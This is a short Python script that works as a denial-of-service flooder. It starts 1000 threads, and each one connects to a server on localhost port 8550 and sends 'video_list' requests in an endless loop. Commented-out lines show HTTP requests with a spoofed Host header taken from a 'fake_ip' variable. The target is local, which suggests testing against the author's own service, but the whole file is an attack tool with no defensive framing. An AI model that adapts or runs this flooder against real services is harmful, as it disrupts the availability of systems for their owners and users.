import atexit
import socket
import threading


def exit_handler():
    for conn in all_connections:
        conn.close()


target = '127.0.0.1'
fake_ip = '182.21.20.32'
port = 8550

attack_num = 0
all_connections = []


# TODO
def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    all_connections.append(s)
    while True:
        # sleep(5)
        s.send(("video_list").encode('ascii'))
        s.recv(1024)
        # s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        # s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))


atexit.register(exit_handler)

for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
